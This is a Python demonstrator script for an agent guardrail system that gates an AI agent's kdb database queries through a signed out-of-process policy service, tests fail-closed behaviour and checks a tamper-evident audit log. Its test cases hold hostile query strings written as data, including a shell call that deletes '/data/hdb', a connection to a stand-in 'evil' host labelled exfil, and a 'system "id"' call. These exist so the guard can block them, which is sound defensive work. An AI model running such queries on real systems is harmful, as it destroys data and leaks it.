"""Stage 3-4 demonstrator — out-of-process PDP + Guard.remote + WORM audit.

Run with the PDP already serving the signed FSP bundle, e.g.:
    PUB=$(cat bundle-fsp/pubkey.hex)
    python -m aegis.pdp_service --policy bundle-fsp/policy.json \
        --sig bundle-fsp/policy.json.sig --pubkey "$PUB" \
        --audit .aegis/fsp-pdp-audit.jsonl --host 127.0.0.1 --port 8788 &
    python -m pilot.stage34_pdp

Proves, on the real PDP:
  1. the agent's gate runs OUT OF PROCESS (Guard.remote) against a signed,
     read-only policy bundle it cannot tamper with — benign allows, dangerous
     kdb actions (incl. the new kdb_guard pack) block, unbounded scans escalate;
  2. fail-closed when the PDP is unreachable (the watertight prod placement);
  3. the audit log is hash-chained and tamper-evident (verify catches edits);
  4. decisions mirror to a WORM sink, and a failed sink fails closed (strict).
"""

from __future__ import annotations

import json
from pathlib import Path

from aegis.audit import AuditLog
from aegis.guard import Guard
from aegis.model import Action, Effect
from aegis.worm_sinks import FileSink, SinkError

REPO = Path(__file__).resolve().parent.parent
PDP = "http://127.0.0.1:8788"
PDP_AUDIT = REPO / ".aegis" / "fsp-pdp-audit.jsonl"


def section(t):
    print(f"\n=== {t} ===")


def main() -> int:
    # 1) remote gate against the signed bundle ------------------------------
    # Each case uses a DISTINCT principal so the (per-principal) supervisor
    # circuit breaker never accumulates across these unrelated probes and mask
    # the per-action verdict. Stale breaker state is cleared first. (The breaker
    # itself is demonstrated in supervisor_test and the earlier incident file.)
    section("1. out-of-process gate (Guard.remote -> signed PDP)")
    breakers = REPO / ".aegis" / "breakers.json"
    if breakers.exists():
        breakers.unlink()
    g = Guard.remote(PDP)
    cases = [
        ("benign read",        "run_query", {"query": "select avg price by sym from trade where date=2015.01.08"}),
        ("kdb system shell",   "run_query", {"query": 'select system "rm -rf /data/hdb" from trade where date=2015.01.08'}),
        ("kdb hopen exfil",    "run_query", {"query": "select from trade where date=2015.01.08, h:hopen `:evil:9999"}),
        ("unbounded scan",     "run_query", {"query": "select from trade"}),
        ("read protected path","read_file", {"path": "aegis/policy.kdb.json"}),
    ]
    for i, (name, tool, ti) in enumerate(cases):
        d = g.check(tool, ti, principal=f"analyst-probe-{i}")
        print(f"  {name:20} -> {d.effect.value:16} {[f.rule_id for f in d.findings][:3]}")

    # 2) fail-closed when the PDP is unreachable ----------------------------
    section("2. fail-closed when PDP unreachable")
    dead = Guard.remote("http://127.0.0.1:9", timeout=2.0)  # nothing listening
    d = dead.check("run_query", {"query": "select from trade where date=2015.01.08"}, principal="x")
    print(f"  PDP down -> {d.effect.value}  ({'FAIL-CLOSED ok' if d.effect is Effect.BLOCK else 'XX not fail-closed'})")

    # 3) tamper-evident audit chain -----------------------------------------
    section("3. tamper-evident audit (PDP hash-chained log)")
    if PDP_AUDIT.exists():
        a = AuditLog(PDP_AUDIT)
        ok, n, err = a.verify()
        print(f"  PDP audit verify: ok={ok} entries={n} {err or ''}")
        # simulate an attacker editing a past decision, then re-verify
        lines = PDP_AUDIT.read_text().splitlines()
        if lines:
            tampered = PDP_AUDIT.with_suffix(".tampered.jsonl")
            rec = json.loads(lines[0]); rec["effect"] = "allow"  # flip a verdict
            lines[0] = json.dumps(rec)
            tampered.write_text("\n".join(lines) + "\n")
            ok2, n2, err2 = AuditLog(tampered).verify()
            print(f"  after editing entry 0: ok={ok2} ({'TAMPER DETECTED' if not ok2 else 'XX missed'}) {err2 or ''}")
            tampered.unlink()
    else:
        print("  (no PDP audit yet)")

    # 4) WORM sink + strict fail-closed -------------------------------------
    section("4. WORM mirror + strict fail-closed")
    from aegis.engine import Engine
    pol = json.loads((REPO / "pilot" / "policy.fsp.json").read_text())
    pol["supervisor"]["enabled"] = False
    eng = Engine(pol, mode="enforce")
    act = Action(tool="run_query",
                 tool_input={"query": 'select system "id" from trade where date=2015.01.08'},
                 principal="analyst-agent")
    dec = eng.evaluate(act)
    worm = REPO / ".aegis" / "fsp-worm.log"
    if worm.exists():
        worm.unlink()
    AuditLog(REPO / ".aegis" / "fsp-local-audit.jsonl",
             sinks=[FileSink(worm)], strict_sinks=True).record(act, dec, principal="analyst-agent")
    mirrored = worm.exists() and worm.stat().st_size > 0
    print(f"  blocked decision ({dec.effect.value}, {[f.rule_id for f in dec.findings][:1]}) "
          f"mirrored to WORM sink {worm.name}: {mirrored}")

    class BrokenSink:
        def append(self, _line):
            raise SinkError("off-host WORM unreachable")
    try:
        AuditLog(REPO / ".aegis" / "fsp-local-audit.jsonl",
                 sinks=[BrokenSink()], strict_sinks=True).record(act, dec, principal="x")
        print("  XX strict sink did NOT fail closed")
    except Exception as e:
        print(f"  broken WORM sink under strict_sinks -> {type(e).__name__} (FAIL-CLOSED ok)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
